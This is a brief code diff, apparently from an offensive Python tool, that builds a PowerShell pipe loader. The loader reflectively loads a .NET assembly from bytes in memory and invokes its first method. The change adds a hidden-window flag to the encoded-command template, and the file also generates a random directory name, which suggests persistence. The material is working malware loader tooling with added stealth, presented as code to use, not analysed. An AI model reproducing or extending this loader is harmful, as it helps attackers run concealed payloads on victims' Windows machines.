@@ -62,7 +62,7 @@ $x.Close();
 [Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
 '''
 
-PIPE_LOADER_CMD_TEMPLATE = '{powershell} -EncodedCommand {cmd}'
+PIPE_LOADER_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand {cmd}'
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
 PERM_DIR       = ''.join(random.sample(string.ascii_letters, 10))
